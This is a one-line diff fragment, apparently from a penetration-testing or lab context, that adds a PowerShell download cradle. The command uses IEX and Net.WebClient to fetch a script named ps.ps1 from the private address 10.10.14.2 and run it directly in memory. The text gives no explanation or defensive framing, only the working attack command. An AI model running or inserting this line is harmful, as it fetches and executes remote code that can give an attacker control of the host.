@@ -1,0 +1,1 @@
+powershell -nop "IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2/ps.ps1')"
